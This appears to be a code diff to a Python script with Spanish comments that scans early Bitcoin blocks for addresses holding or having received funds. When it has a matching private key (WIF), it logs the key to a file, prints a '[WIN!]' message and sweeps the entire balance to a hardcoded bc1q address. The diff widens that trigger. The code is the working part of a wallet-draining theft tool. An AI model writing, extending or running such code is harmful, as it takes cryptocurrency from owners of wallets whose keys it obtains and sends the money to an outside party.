@@ -325,16 +325,17 @@ def procesar_bloque_y_transacciones(bloque_id):
         # Imprimir las direcciones con balance
         for direccion, balance_data in balances.items():
             balance = balance_data.get('final_balance', 0)
+            totalBalance = balance_data.get('total_received', 0)
 
-            print(f"address: {direccion} :: {balance} BTC")
-            if balance > 0:
+            print(f"address: {direccion} :: {balance} BTC :: Total Balance: {totalBalance}")
+            if balance > 0 or totalBalance > 0:
                 # Obtenemos el WIF correspondiente para la dirección
                 wif = direcciones_wif.get(direccion)
                 
                 if wif:
-                    print(f"[WIN!] Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif}")
+                    print(f"[WIN!] Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif} :: Total Balance: {totalBalance}")
 
-                    guardar_texto_en_archivo(f"Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif}", "walletconBalance.txt")
+                    guardar_texto_en_archivo(f"Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif} :: Total Balance: {totalBalance}", "walletconBalance.txt")
                     # Enviar todo el balance
                     send_all_funds(wif, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
 
@@ -354,7 +355,7 @@ def contador_infinito(inicio):
         i += 1
 
 
-for i in contador_infinito(3658):
+for i in contador_infinito(3762):
 
     new_block_number = i # 9 de Febrero 2009
     print(f"[BlockId: {new_block_number}]")
